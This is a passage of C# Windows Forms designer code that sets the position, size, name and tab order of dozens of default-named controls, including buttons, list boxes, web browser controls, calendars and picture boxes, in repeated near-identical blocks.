			this.WebBrowser4.MinimumSize = new Size(20, 20);
			this.WebBrowser4.Name = "WebBrowser4";
			this.WebBrowser4.Size = new Size(62, 57);
			this.WebBrowser4.TabIndex = 79;
			this.TextBox4.Location = new Point(58, 270);
			this.TextBox4.Name = "TextBox4";
			this.TextBox4.Size = new Size(100, 20);
			this.TextBox4.TabIndex = 78;
			this.RichTextBox4.Location = new Point(24, 71);
			this.RichTextBox4.Name = "RichTextBox4";
			this.RichTextBox4.Size = new Size(100, 96);
			this.RichTextBox4.TabIndex = 77;
			this.RichTextBox4.Text = "";
			this.RadioButton4.AutoSize = true;
			this.RadioButton4.Location = new Point(36, 14);
			this.RadioButton4.Name = "RadioButton4";
			this.RadioButton4.Size = new Size(90, 17);
			this.RadioButton4.TabIndex = 76;
			this.RadioButton4.TabStop = true;
			this.RadioButton4.Text = "RadioButton4";
			this.RadioButton4.UseVisualStyleBackColor = true;
			this.NumericUpDown4.Location = new Point(449, 62);
			this.NumericUpDown4.Name = "NumericUpDown4";
			this.NumericUpDown4.Size = new Size(120, 20);
			this.NumericUpDown4.TabIndex = 75;
			this.MonthCalendar4.Location = new Point(422, 131);
			this.MonthCalendar4.Name = "MonthCalendar4";
			this.MonthCalendar4.TabIndex = 74;
			this.MaskedTextBox8.Location = new Point(76, 179);
			this.MaskedTextBox8.Name = "MaskedTextBox8";
			this.MaskedTextBox8.Size = new Size(100, 20);
			this.MaskedTextBox8.TabIndex = 73;
			this.ListView4.HideSelection = false;
			this.ListView4.Location = new Point(323, 207);
			this.ListView4.Name = "ListView4";
			this.ListView4.Size = new Size(121, 97);
			this.ListView4.TabIndex = 72;
			this.ListView4.UseCompatibleStateImageBehavior = false;
			this.Label4.AutoSize = true;
			this.Label4.Location = new Point(167, 36);
			this.Label4.Name = "Label4";
			this.Label4.Size = new Size(39, 13);
			this.Label4.TabIndex = 71;
			this.Label4.Text = "Label4";
			this.ComboBox8.FormattingEnabled = true;
			this.ComboBox8.Location = new Point(458, 98);
			this.ComboBox8.Name = "ComboBox8";
			this.ComboBox8.Size = new Size(121, 21);
			this.ComboBox8.TabIndex = 70;
			this.DateTimePicker4.Location = new Point(56, 235);
			this.DateTimePicker4.Name = "DateTimePicker4";
			this.DateTimePicker4.Size = new Size(200, 20);
			this.DateTimePicker4.TabIndex = 69;
			this.CheckedListBox8.FormattingEnabled = true;
			this.CheckedListBox8.Location = new Point(237, 85);
			this.CheckedListBox8.Name = "CheckedListBox8";
			this.CheckedListBox8.Size = new Size(120, 94);
			this.CheckedListBox8.TabIndex = 68;
			this.CheckBox4.AutoSize = true;
			this.CheckBox4.Location = new Point(363, 8);
			this.CheckBox4.Name = "CheckBox4";
			this.CheckBox4.Size = new Size(81, 17);
			this.CheckBox4.TabIndex = 67;
			this.CheckBox4.Text = "CheckBox4";
			this.CheckBox4.UseVisualStyleBackColor = true;
			this.Button4.Location = new Point(90, 97);
			this.Button4.Name = "Button4";
			this.Button4.Size = new Size(75, 23);
			this.Button4.TabIndex = 66;
			this.Button4.Text = "Button4";
			this.Button4.UseVisualStyleBackColor = true;
			this.CheckedListBox9.FormattingEnabled = true;
			this.CheckedListBox9.Location = new Point(126, 73);
			this.CheckedListBox9.Name = "CheckedListBox9";
			this.CheckedListBox9.Size = new Size(120, 94);
			this.CheckedListBox9.TabIndex = 109;
			this.ComboBox9.FormattingEnabled = true;
			this.ComboBox9.Location = new Point(144, 60);
			this.ComboBox9.Name = "ComboBox9";
			this.ComboBox9.Size = new Size(8, 21);
			this.ComboBox9.TabIndex = 108;
			this.ListBox5.FormattingEnabled = true;
			this.ListBox5.Location = new Point(222, 136);
			this.ListBox5.Name = "ListBox5";
			this.ListBox5.Size = new Size(120, 95);
			this.ListBox5.TabIndex = 107;
			this.LinkLabel5.AutoSize = true;
			this.LinkLabel5.Location = new Point(232, 36);
			this.LinkLabel5.Name = "LinkLabel5";
			this.LinkLabel5.Size = new Size(59, 13);
			this.LinkLabel5.TabIndex = 106;
			this.LinkLabel5.TabStop = true;
			this.LinkLabel5.Text = "LinkLabel5";
			this.MaskedTextBox9.Location = new Point(201, 220);
			this.MaskedTextBox9.Name = "MaskedTextBox9";
			this.MaskedTextBox9.Size = new Size(100, 20);
			this.MaskedTextBox9.TabIndex = 105;
			this.ProgressBar5.Location = new Point(220, 268);
			this.ProgressBar5.Name = "ProgressBar5";
			this.ProgressBar5.Size = new Size(100, 23);
			this.ProgressBar5.TabIndex = 104;
			this.PictureBox9.Location = new Point(370, 28);
			this.PictureBox9.Name = "PictureBox9";
			this.PictureBox9.Size = new Size(168, 91);
			this.PictureBox9.TabIndex = 103;
			this.PictureBox9.TabStop = false;
			this.PictureBox10.Location = new Point(370, 90);
			this.PictureBox10.Name = "PictureBox10";
			this.PictureBox10.Size = new Size(8, 8);
			this.PictureBox10.TabIndex = 102;
			this.PictureBox10.TabStop = false;
			this.WebBrowser5.Location = new Point(0, 190);
			this.WebBrowser5.MinimumSize = new Size(20, 20);
			this.WebBrowser5.Name = "WebBrowser5";
			this.WebBrowser5.Size = new Size(62, 57);
			this.WebBrowser5.TabIndex = 101;
			this.TextBox5.Location = new Point(50, 262);
			this.TextBox5.Name = "TextBox5";
			this.TextBox5.Size = new Size(100, 20);
			this.TextBox5.TabIndex = 100;
			this.RichTextBox5.Location = new Point(16, 63);
			this.RichTextBox5.Name = "RichTextBox5";
			this.RichTextBox5.Size = new Size(100, 96);
			this.RichTextBox5.TabIndex = 99;
			this.RichTextBox5.Text = "";
			this.RadioButton5.AutoSize = true;
			this.RadioButton5.Location = new Point(28, 6);
			this.RadioButton5.Name = "RadioButton5";
			this.RadioButton5.Size = new Size(90, 17);
			this.RadioButton5.TabIndex = 98;
			this.RadioButton5.TabStop = true;
			this.RadioButton5.Text = "RadioButton5";
			this.RadioButton5.UseVisualStyleBackColor = true;
			this.NumericUpDown5.Location = new Point(441, 54);
			this.NumericUpDown5.Name = "NumericUpDown5";
			this.NumericUpDown5.Size = new Size(120, 20);
			this.NumericUpDown5.TabIndex = 97;
			this.MonthCalendar5.Location = new Point(414, 123);
			this.MonthCalendar5.Name = "MonthCalendar5";
			this.MonthCalendar5.TabIndex = 96;
			this.MaskedTextBox10.Location = new Point(68, 171);
			this.MaskedTextBox10.Name = "MaskedTextBox10";
			this.MaskedTextBox10.Size = new Size(100, 20);
			this.MaskedTextBox10.TabIndex = 95;
			this.ListView5.HideSelection = false;
			this.ListView5.Location = new Point(315, 199);
			this.ListView5.Name = "ListView5";
			this.ListView5.Size = new Size(121, 97);
			this.ListView5.TabIndex = 94;
			this.ListView5.UseCompatibleStateImageBehavior = false;
			this.Label5.AutoSize = true;
			this.Label5.Location = new Point(159, 28);
			this.Label5.Name = "Label5";
			this.Label5.Size = new Size(39, 13);
			this.Label5.TabIndex = 93;
			this.Label5.Text = "Label5";
			this.ComboBox10.FormattingEnabled = true;
			this.ComboBox10.Location = new Point(450, 90);
			this.ComboBox10.Name = "ComboBox10";
			this.ComboBox10.Size = new Size(121, 21);
			this.ComboBox10.TabIndex = 92;
			this.DateTimePicker5.Location = new Point(48, 227);
			this.DateTimePicker5.Name = "DateTimePicker5";
			this.DateTimePicker5.Size = new Size(200, 20);
			this.DateTimePicker5.TabIndex = 91;
			this.CheckedListBox10.FormattingEnabled = true;
			this.CheckedListBox10.Location = new Point(229, 77);
			this.CheckedListBox10.Name = "CheckedListBox10";
			this.CheckedListBox10.Size = new Size(120, 94);
			this.CheckedListBox10.TabIndex = 90;
			this.CheckBox5.AutoSize = true;
			this.CheckBox5.Location = new Point(355, 0);
			this.CheckBox5.Name = "CheckBox5";
			this.CheckBox5.Size = new Size(81, 17);
			this.CheckBox5.TabIndex = 89;
			this.CheckBox5.Text = "CheckBox5";
			this.CheckBox5.UseVisualStyleBackColor = true;
			this.Button5.Location = new Point(82, 89);
			this.Button5.Name = "Button5";
			this.Button5.Size = new Size(75, 23);
			this.Button5.TabIndex = 88;
			this.Button5.Text = "Button5";
			this.Button5.UseVisualStyleBackColor = true;
			this.CheckedListBox11.FormattingEnabled = true;
			this.CheckedListBox11.Location = new Point(126, 73);
			this.CheckedListBox11.Name = "CheckedListBox11";
			this.CheckedListBox11.Size = new Size(120, 94);
			this.CheckedListBox11.TabIndex = 131;
			this.ComboBox11.FormattingEnabled = true;
			this.ComboBox11.Location = new Point(144, 60);
			this.ComboBox11.Name = "ComboBox11";
			this.ComboBox11.Size = new Size(8, 21);
			this.ComboBox11.TabIndex = 130;
			this.ListBox6.FormattingEnabled = true;
			this.ListBox6.Location = new Point(222, 136);
			this.ListBox6.Name = "ListBox6";
			this.ListBox6.Size = new Size(120, 95);
			this.ListBox6.TabIndex = 129;
			this.LinkLabel6.AutoSize = true;
			this.LinkLabel6.Location = new Point(232, 36);
			this.LinkLabel6.Name = "LinkLabel6";
			this.LinkLabel6.Size = new Size(59, 13);
			this.LinkLabel6.TabIndex = 128;
			this.LinkLabel6.TabStop = true;
			this.LinkLabel6.Text = "LinkLabel6";
			this.MaskedTextBox11.Location = new Point(201, 220);
			this.MaskedTextBox11.Name = "MaskedTextBox11";
			this.MaskedTextBox11.Size = new Size(100, 20);
			this.MaskedTextBox11.TabIndex = 127;
			this.ProgressBar6.Location = new Point(220, 268);
			this.ProgressBar6.Name = "ProgressBar6";
			this.ProgressBar6.Size = new Size(100, 23);
			this.ProgressBar6.TabIndex = 126;
			this.PictureBox11.Location = new Point(370, 28);
			this.PictureBox11.Name = "PictureBox11";
			this.PictureBox11.Size = new Size(168, 91);
			this.PictureBox11.TabIndex = 125;
			this.PictureBox11.TabStop = false;
			this.PictureBox12.Location = new Point(370, 90);
			this.PictureBox12.Name = "PictureBox12";
			this.PictureBox12.Size = new Size(8, 8);
			this.PictureBox12.TabIndex = 124;
			this.PictureBox12.TabStop = false;
			this.WebBrowser6.Location = new Point(0, 190);
			this.WebBrowser6.MinimumSize = new Size(20, 20);
			this.WebBrowser6.Name = "WebBrowser6";
			this.WebBrowser6.Size = new Size(62, 57);
			this.WebBrowser6.TabIndex = 123;
			this.TextBox6.Location = new Point(50, 262);
			this.TextBox6.Name = "TextBox6";
			this.TextBox6.Size = new Size(100, 20);
			this.TextBox6.TabIndex = 122;
			this.RichTextBox6.Location = new Point(16, 63);
			this.RichTextBox6.Name = "RichTextBox6";
			this.RichTextBox6.Size = new Size(100, 96);
			this.RichTextBox6.TabIndex = 121;
			this.RichTextBox6.Text = "";
			this.RadioButton6.AutoSize = true;
			this.RadioButton6.Location = new Point(28, 6);
			this.RadioButton6.Name = "RadioButton6";
			this.RadioButton6.Size = new Size(90, 17);
			this.RadioButton6.TabIndex = 120;
			this.RadioButton6.TabStop = true;
			this.RadioButton6.Text = "RadioButton6";
			this.RadioButton6.UseVisualStyleBackColor = true;
			this.NumericUpDown6.Location = new Point(441, 54);
			this.NumericUpDown6.Name = "NumericUpDown6";
			this.NumericUpDown6.Size = new Size(120, 20);
			this.NumericUpDown6.TabIndex = 119;
			this.MonthCalendar6.Location = new Point(414, 123);
			this.MonthCalendar6.Name = "MonthCalendar6";
			this.MonthCalendar6.TabIndex = 118;
			this.MaskedTextBox12.Location = new Point(68, 171);
			this.MaskedTextBox12.Name = "MaskedTextBox12";
			this.MaskedTextBox12.Size = new Size(100, 20);
			this.MaskedTextBox12.TabIndex = 117;
			this.ListView6.HideSelection = false;
			this.ListView6.Location = new Point(315, 199);
			this.ListView6.Name = "ListView6";
			this.ListView6.Size = new Size(121, 97);
			this.ListView6.TabIndex = 116;
			this.ListView6.UseCompatibleStateImageBehavior = false;
			this.Label6.AutoSize = true;
			this.Label6.Location = new Point(159, 28);
			this.Label6.Name = "Label6";
			this.Label6.Size = new Size(39, 13);
			this.Label6.TabIndex = 115;
			this.Label6.Text = "Label6";
			this.ComboBox12.FormattingEnabled = true;
			this.ComboBox12.Location = new Point(450, 90);
			this.ComboBox12.Name = "ComboBox12";
			this.ComboBox12.Size = new Size(121, 21);
			this.ComboBox12.TabIndex = 114;
			this.DateTimePicker6.Location = new Point(48, 227);
			this.DateTimePicker6.Name = "DateTimePicker6";
			this.DateTimePicker6.Size = new Size(200, 20);
			this.DateTimePicker6.TabIndex = 113;
			this.CheckedListBox12.FormattingEnabled = true;
			this.CheckedListBox12.Location = new Point(229, 77);
			this.CheckedListBox12.Name = "CheckedListBox12";
			this.CheckedListBox12.Size = new Size(120, 94);
			this.CheckedListBox12.TabIndex = 112;
			this.CheckBox6.AutoSize = true;
			this.CheckBox6.Location = new Point(355, 0);
			this.CheckBox6.Name = "CheckBox6";
			this.CheckBox6.Size = new Size(81, 17);
			this.CheckBox6.TabIndex = 111;
			this.CheckBox6.Text = "CheckBox6";
			this.CheckBox6.UseVisualStyleBackColor = true;
			this.Button6.Location = new Point(82, 89);
			this.Button6.Name = "Button6";
			this.Button6.Size = new Size(75, 23);
			this.Button6.TabIndex = 110;
			this.Button6.Text = "Button6";
			this.Button6.UseVisualStyleBackColor = true;
			this.CheckedListBox13.FormattingEnabled = true;
			this.CheckedListBox13.Location = new Point(171, 50);
			this.CheckedListBox13.Name = "CheckedListBox13";
			this.CheckedListBox13.Size = new Size(120, 94);
			this.CheckedListBox13.TabIndex = 256;
			this.ComboBox13.FormattingEnabled = true;
			this.ComboBox13.Location = new Point(189, 37);
			this.ComboBox13.Name = "ComboBox13";
			this.ComboBox13.Size = new Size(8, 21);
			this.ComboBox13.TabIndex = 255;
			this.ListBox7.FormattingEnabled = true;
			this.ListBox7.Location = new Point(267, 113);
			this.ListBox7.Name = "ListBox7";
			this.ListBox7.Size = new Size(120, 95);
			this.ListBox7.TabIndex = 254;
			this.LinkLabel7.AutoSize = true;
			this.LinkLabel7.Location = new Point(277, 13);
			this.LinkLabel7.Name = "LinkLabel7";
			this.LinkLabel7.Size = new Size(59, 13);
			this.LinkLabel7.TabIndex = 253;
			this.LinkLabel7.TabStop = true;
			this.LinkLabel7.Text = "LinkLabel7";
			this.MaskedTextBox13.Location = new Point(246, 197);
			this.MaskedTextBox13.Name = "MaskedTextBox13";
			this.MaskedTextBox13.Size = new Size(100, 20);
			this.MaskedTextBox13.TabIndex = 252;
			this.ProgressBar7.Location = new Point(265, 245);
			this.ProgressBar7.Name = "ProgressBar7";
			this.ProgressBar7.Size = new Size(100, 23);
			this.ProgressBar7.TabIndex = 251;
			this.PictureBox13.Location = new Point(415, 5);
			this.PictureBox13.Name = "PictureBox13";
			this.PictureBox13.Size = new Size(168, 91);
			this.PictureBox13.TabIndex = 250;
			this.PictureBox13.TabStop = false;
			this.PictureBox14.Location = new Point(415, 67);
			this.PictureBox14.Name = "PictureBox14";
			this.PictureBox14.Size = new Size(8, 8);
			this.PictureBox14.TabIndex = 249;
			this.PictureBox14.TabStop = false;
			this.WebBrowser7.Location = new Point(45, 167);
			this.WebBrowser7.MinimumSize = new Size(20, 20);
			this.WebBrowser7.Name = "WebBrowser7";
			this.WebBrowser7.Size = new Size(62, 57);
			this.WebBrowser7.TabIndex = 248;
			this.TextBox7.Location = new Point(95, 239);
			this.TextBox7.Name = "TextBox7";
			this.TextBox7.Size = new Size(100, 20);
			this.TextBox7.TabIndex = 247;
			this.RichTextBox7.Location = new Point(61, 40);
			this.RichTextBox7.Name = "RichTextBox7";
			this.RichTextBox7.Size = new Size(100, 96);
			this.RichTextBox7.TabIndex = 246;
			this.RichTextBox7.Text = "";
			this.NumericUpDown7.Location = new Point(486, 31);
			this.NumericUpDown7.Name = "NumericUpDown7";
			this.NumericUpDown7.Size = new Size(120, 20);
			this.NumericUpDown7.TabIndex = 245;
			this.MonthCalendar7.Location = new Point(459, 100);
			this.MonthCalendar7.Name = "MonthCalendar7";
			this.MonthCalendar7.TabIndex = 244;
			this.MaskedTextBox14.Location = new Point(113, 148);
			this.MaskedTextBox14.Name = "MaskedTextBox14";
			this.MaskedTextBox14.Size = new Size(100, 20);
			this.MaskedTextBox14.TabIndex = 243;
			this.ListView7.HideSelection = false;
			this.ListView7.Location = new Point(360, 176);
			this.ListView7.Name = "ListView7";
			this.ListView7.Size = new Size(121, 97);
			this.ListView7.TabIndex = 242;
			this.ListView7.UseCompatibleStateImageBehavior = false;
			this.Label7.AutoSize = true;
			this.Label7.Location = new Point(204, 5);
			this.Label7.Name = "Label7";
			this.Label7.Size = new Size(39, 13);
			this.Label7.TabIndex = 241;
			this.Label7.Text = "Label7";
			this.ComboBox14.FormattingEnabled = true;
			this.ComboBox14.Location = new Point(495, 67);
			this.ComboBox14.Name = "ComboBox14";
			this.ComboBox14.Size = new Size(121, 21);
			this.ComboBox14.TabIndex = 240;
			this.DateTimePicker7.Location = new Point(93, 204);
			this.DateTimePicker7.Name = "DateTimePicker7";
			this.DateTimePicker7.Size = new Size(200, 20);
			this.DateTimePicker7.TabIndex = 239;
			this.CheckedListBox14.FormattingEnabled = true;
			this.CheckedListBox14.Location = new Point(274, 54);
			this.CheckedListBox14.Name = "CheckedListBox14";
			this.CheckedListBox14.Size = new Size(120, 94);
			this.CheckedListBox14.TabIndex = 238;
			this.Button7.Location = new Point(127, 66);
			this.Button7.Name = "Button7";
			this.Button7.Size = new Size(75, 23);
			this.Button7.TabIndex = 237;
			this.Button7.Text = "Button7";
			this.Button7.UseVisualStyleBackColor = true;
			this.CheckedListBox15.FormattingEnabled = true;
			this.CheckedListBox15.Location = new Point(171, 50);
			this.CheckedListBox15.Name = "CheckedListBox15";
			this.CheckedListBox15.Size = new Size(120, 94);
			this.CheckedListBox15.TabIndex = 236;
			this.ComboBox15.FormattingEnabled = true;
			this.ComboBox15.Location = new Point(189, 37);
			this.ComboBox15.Name = "ComboBox15";
			this.ComboBox15.Size = new Size(8, 21);
			this.ComboBox15.TabIndex = 235;
			this.ListBox8.FormattingEnabled = true;
			this.ListBox8.Location = new Point(267, 113);
			this.ListBox8.Name = "ListBox8";
			this.ListBox8.Size = new Size(120, 95);
			this.ListBox8.TabIndex = 234;
			this.LinkLabel8.AutoSize = true;
			this.LinkLabel8.Location = new Point(277, 13);
			this.LinkLabel8.Name = "LinkLabel8";
			this.LinkLabel8.Size = new Size(59, 13);
			this.LinkLabel8.TabIndex = 233;
			this.LinkLabel8.TabStop = true;
			this.LinkLabel8.Text = "LinkLabel8";
			this.MaskedTextBox15.Location = new Point(246, 197);
			this.MaskedTextBox15.Name = "MaskedTextBox15";
			this.MaskedTextBox15.Size = new Size(100, 20);
			this.MaskedTextBox15.TabIndex = 232;
			this.ProgressBar8.Location = new Point(265, 245);
			this.ProgressBar8.Name = "ProgressBar8";
			this.ProgressBar8.Size = new Size(100, 23);
			this.ProgressBar8.TabIndex = 231;
			this.PictureBox15.Location = new Point(415, 5);
			this.PictureBox15.Name = "PictureBox15";
			this.PictureBox15.Size = new Size(168, 91);
			this.PictureBox15.TabIndex = 230;
			this.PictureBox15.TabStop = false;
			this.PictureBox16.Location = new Point(415, 67);
			this.PictureBox16.Name = "PictureBox16";
			this.PictureBox16.Size = new Size(8, 8);
			this.PictureBox16.TabIndex = 229;
			this.PictureBox16.TabStop = false;
			this.WebBrowser8.Location = new Point(45, 167);
			this.WebBrowser8.MinimumSize = new Size(20, 20);
			this.WebBrowser8.Name = "WebBrowser8";
			this.WebBrowser8.Size = new Size(62, 57);
			this.WebBrowser8.TabIndex = 228;
			this.TextBox8.Location = new Point(95, 239);
			this.TextBox8.Name = "TextBox8";
			this.TextBox8.Size = new Size(100, 20);
			this.TextBox8.TabIndex = 227;
			this.RichTextBox8.Location = new Point(61, 40);
			this.RichTextBox8.Name = "RichTextBox8";
			this.RichTextBox8.Size = new Size(100, 96);
			this.RichTextBox8.TabIndex = 226;
			this.RichTextBox8.Text = "";
			this.NumericUpDown8.Location = new Point(486, 31);
			this.NumericUpDown8.Name = "NumericUpDown8";
			this.NumericUpDown8.Size = new Size(120, 20);
			this.NumericUpDown8.TabIndex = 225;
			this.MonthCalendar8.Location = new Point(459, 100);
			this.MonthCalendar8.Name = "MonthCalendar8";
			this.MonthCalendar8.TabIndex = 224;
			this.MaskedTextBox16.Location = new Point(113, 148);
			this.MaskedTextBox16.Name = "MaskedTextBox16";
			this.MaskedTextBox16.Size = new Size(100, 20);
			this.MaskedTextBox16.TabIndex = 223;
			this.ListView8.HideSelection = false;
			this.ListView8.Location = new Point(360, 176);
			this.ListView8.Name = "ListView8";
			this.ListView8.Size = new Size(121, 97);
			this.ListView8.TabIndex = 222;
			this.ListView8.UseCompatibleStateImageBehavior = false;
			this.Label8.AutoSize = true;
			this.Label8.Location = new Point(204, 5);
			this.Label8.Name = "Label8";
			this.Label8.Size = new Size(39, 13);
			this.Label8.TabIndex = 221;
			this.Label8.Text = "Label8";
			this.ComboBox16.FormattingEnabled = true;
			this.ComboBox16.Location = new Point(495, 67);
			this.ComboBox16.Name = "ComboBox16";
			this.ComboBox16.Size = new Size(121, 21);
			this.ComboBox16.TabIndex = 220;
			this.DateTimePicker8.Location = new Point(93, 204);
			this.DateTimePicker8.Name = "DateTimePicker8";
			this.DateTimePicker8.Size = new Size(200, 20);
			this.DateTimePicker8.TabIndex = 219;
			this.CheckedListBox16.FormattingEnabled = true;
			this.CheckedListBox16.Location = new Point(274, 54);
			this.CheckedListBox16.Name = "CheckedListBox16";
			this.CheckedListBox16.Size = new Size(120, 94);
			this.CheckedListBox16.TabIndex = 218;
			this.Button8.Location = new Point(127, 66);
			this.Button8.Name = "Button8";
			this.Button8.Size = new Size(75, 23);
			this.Button8.TabIndex = 217;
			this.Button8.Text = "Button8";
			this.Button8.UseVisualStyleBackColor = true;
			this.CheckedListBox17.FormattingEnabled = true;
			this.CheckedListBox17.Location = new Point(179, 58);
			this.CheckedListBox17.Name = "CheckedListBox17";
			this.CheckedListBox17.Size = new Size(120, 94);
			this.CheckedListBox17.TabIndex = 216;
			this.ComboBox17.FormattingEnabled = true;
			this.ComboBox17.Location = new Point(197, 45);
			this.ComboBox17.Name = "ComboBox17";
			this.ComboBox17.Size = new Size(8, 21);
			this.ComboBox17.TabIndex = 215;
			this.ListBox9.FormattingEnabled = true;
			this.ListBox9.Location = new Point(275, 121);
			this.ListBox9.Name = "ListBox9";
			this.ListBox9.Size = new Size(120, 95);
			this.ListBox9.TabIndex = 214;
			this.LinkLabel9.AutoSize = true;
			this.LinkLabel9.Location = new Point(285, 21);
			this.LinkLabel9.Name = "LinkLabel9";
			this.LinkLabel9.Size = new Size(59, 13);
			this.LinkLabel9.TabIndex = 213;
			this.LinkLabel9.TabStop = true;
			this.LinkLabel9.Text = "LinkLabel9";
			this.MaskedTextBox17.Location = new Point(254, 205);
			this.MaskedTextBox17.Name = "MaskedTextBox17";
			this.MaskedTextBox17.Size = new Size(100, 20);
			this.MaskedTextBox17.TabIndex = 212;
			this.ProgressBar9.Location = new Point(273, 253);
			this.ProgressBar9.Name = "ProgressBar9";
			this.ProgressBar9.Size = new Size(100, 23);
			this.ProgressBar9.TabIndex = 211;
			this.PictureBox17.Location = new Point(423, 13);
			this.PictureBox17.Name = "PictureBox17";
			this.PictureBox17.Size = new Size(168, 91);
			this.PictureBox17.TabIndex = 210;
			this.PictureBox17.TabStop = false;
			this.PictureBox18.Location = new Point(423, 75);
			this.PictureBox18.Name = "PictureBox18";
			this.PictureBox18.Size = new Size(8, 8);
			this.PictureBox18.TabIndex = 209;
			this.PictureBox18.TabStop = false;
			this.WebBrowser9.Location = new Point(53, 175);
			this.WebBrowser9.MinimumSize = new Size(20, 20);
			this.WebBrowser9.Name = "WebBrowser9";
			this.WebBrowser9.Size = new Size(62, 57);
			this.WebBrowser9.TabIndex = 208;
			this.TextBox9.Location = new Point(103, 247);
			this.TextBox9.Name = "TextBox9";
			this.TextBox9.Size = new Size(100, 20);
			this.TextBox9.TabIndex = 207;
			this.RichTextBox9.Location = new Point(69, 48);
			this.RichTextBox9.Name = "RichTextBox9";
			this.RichTextBox9.Size = new Size(100, 96);
			this.RichTextBox9.TabIndex = 206;
			this.RichTextBox9.Text = "";
			this.RadioButton7.AutoSize = true;
			this.RadioButton7.Location = new Point(81, -9);
			this.RadioButton7.Name = "RadioButton7";
			this.RadioButton7.Size = new Size(90, 17);
			this.RadioButton7.TabIndex = 205;
			this.RadioButton7.TabStop = true;
			this.RadioButton7.Text = "RadioButton7";
			this.RadioButton7.UseVisualStyleBackColor = true;
			this.NumericUpDown9.Location = new Point(494, 39);
			this.NumericUpDown9.Name = "NumericUpDown9";
			this.NumericUpDown9.Size = new Size(120, 20);
			this.NumericUpDown9.TabIndex = 204;
			this.MonthCalendar9.Location = new Point(467, 108);
			this.MonthCalendar9.Name = "MonthCalendar9";
			this.MonthCalendar9.TabIndex = 203;
			this.MaskedTextBox18.Location = new Point(121, 156);
			this.MaskedTextBox18.Name = "MaskedTextBox18";
			this.MaskedTextBox18.Size = new Size(100, 20);
			this.MaskedTextBox18.TabIndex = 202;
			this.ListView9.HideSelection = false;
			this.ListView9.Location = new Point(368, 184);
			this.ListView9.Name = "ListView9";
			this.ListView9.Size = new Size(121, 97);
			this.ListView9.TabIndex = 201;
			this.ListView9.UseCompatibleStateImageBehavior = false;
			this.Label9.AutoSize = true;
			this.Label9.Location = new Point(212, 13);
			this.Label9.Name = "Label9";
			this.Label9.Size = new Size(39, 13);
			this.Label9.TabIndex = 200;
			this.Label9.Text = "Label9";
			this.ComboBox18.FormattingEnabled = true;
			this.ComboBox18.Location = new Point(503, 75);
			this.ComboBox18.Name = "ComboBox18";
			this.ComboBox18.Size = new Size(121, 21);
			this.ComboBox18.TabIndex = 199;
			this.DateTimePicker9.Location = new Point(101, 212);
			this.DateTimePicker9.Name = "DateTimePicker9";
			this.DateTimePicker9.Size = new Size(200, 20);
			this.DateTimePicker9.TabIndex = 198;
			this.CheckedListBox18.FormattingEnabled = true;
			this.CheckedListBox18.Location = new Point(282, 62);
			this.CheckedListBox18.Name = "CheckedListBox18";
			this.CheckedListBox18.Size = new Size(120, 94);
			this.CheckedListBox18.TabIndex = 197;
			this.Button9.Location = new Point(135, 74);
			this.Button9.Name = "Button9";
			this.Button9.Size = new Size(75, 23);
			this.Button9.TabIndex = 196;
			this.Button9.Text = "Button9";
			this.Button9.UseVisualStyleBackColor = true;
			this.CheckedListBox19.FormattingEnabled = true;
			this.CheckedListBox19.Location = new Point(171, 50);
			this.CheckedListBox19.Name = "CheckedListBox19";
			this.CheckedListBox19.Size = new Size(120, 94);
			this.CheckedListBox19.TabIndex = 195;
			this.ComboBox19.FormattingEnabled = true;
			this.ComboBox19.Location = new Point(189, 37);
			this.ComboBox19.Name = "ComboBox19";
			this.ComboBox19.Size = new Size(8, 21);
			this.ComboBox19.TabIndex = 194;
			this.ListBox10.FormattingEnabled = true;
			this.ListBox10.Location = new Point(267, 113);
			this.ListBox10.Name = "ListBox10";
			this.ListBox10.Size = new Size(120, 95);
			this.ListBox10.TabIndex = 193;
			this.LinkLabel10.AutoSize = true;
			this.LinkLabel10.Location = new Point(277, 13);
			this.LinkLabel10.Name = "LinkLabel10";
			this.LinkLabel10.Size = new Size(65, 13);
			this.LinkLabel10.TabIndex = 192;
			this.LinkLabel10.TabStop = true;
			this.LinkLabel10.Text = "LinkLabel10";
			this.MaskedTextBox19.Location = new Point(246, 197);
			this.MaskedTextBox19.Name = "MaskedTextBox19";
			this.MaskedTextBox19.Size = new Size(100, 20);
			this.MaskedTextBox19.TabIndex = 191;
			this.ProgressBar10.Location = new Point(265, 245);
			this.ProgressBar10.Name = "ProgressBar10";
			this.ProgressBar10.Size = new Size(100, 23);
			this.ProgressBar10.TabIndex = 190;
			this.PictureBox19.Location = new Point(415, 5);
			this.PictureBox19.Name = "PictureBox19";
			this.PictureBox19.Size = new Size(168, 91);
			this.PictureBox19.TabIndex = 189;
			this.PictureBox19.TabStop = false;
			this.PictureBox20.Location = new Point(415, 67);
			this.PictureBox20.Name = "PictureBox20";
			this.PictureBox20.Size = new Size(8, 8);
			this.PictureBox20.TabIndex = 188;
			this.PictureBox20.TabStop = false;
			this.WebBrowser10.Location = new Point(45, 167);
			this.WebBrowser10.MinimumSize = new Size(20, 20);
			this.WebBrowser10.Name = "WebBrowser10";
			this.WebBrowser10.Size = new Size(62, 57);
			this.WebBrowser10.TabIndex = 187;
			this.TextBox10.Location = new Point(95, 239);
			this.TextBox10.Name = "TextBox10";
			this.TextBox10.Size = new Size(100, 20);
			this.TextBox10.TabIndex = 186;
			this.RichTextBox10.Location = new Point(61, 40);
			this.RichTextBox10.Name = "RichTextBox10";
			this.RichTextBox10.Size = new Size(100, 96);
			this.RichTextBox10.TabIndex = 185;
			this.RichTextBox10.Text = "";
			this.NumericUpDown10.Location = new Point(486, 31);
			this.NumericUpDown10.Name = "NumericUpDown10";
			this.NumericUpDown10.Size = new Size(120, 20);
			this.NumericUpDown10.TabIndex = 184;
			this.MonthCalendar10.Location = new Point(459, 100);
			this.MonthCalendar10.Name = "MonthCalendar10";
			this.MonthCalendar10.TabIndex = 183;
			this.MaskedTextBox20.Location = new Point(113, 148);
			this.MaskedTextBox20.Name = "MaskedTextBox20";
			this.MaskedTextBox20.Size = new Size(100, 20);
			this.MaskedTextBox20.TabIndex = 182;
			this.ListView10.HideSelection = false;
			this.ListView10.Location = new Point(360, 176);
			this.ListView10.Name = "ListView10";
			this.ListView10.Size = new Size(121, 97);
			this.ListView10.TabIndex = 181;
			this.ListView10.UseCompatibleStateImageBehavior = false;
			this.Label10.AutoSize = true;
			this.Label10.Location = new Point(204, 5);
			this.Label10.Name = "Label10";
			this.Label10.Size = new Size(45, 13);
			this.Label10.TabIndex = 180;
			this.Label10.Text = "Label10";
			this.ComboBox20.FormattingEnabled = true;
			this.ComboBox20.Location = new Point(495, 67);
			this.ComboBox20.Name = "ComboBox20";
			this.ComboBox20.Size = new Size(121, 21);
			this.ComboBox20.TabIndex = 179;
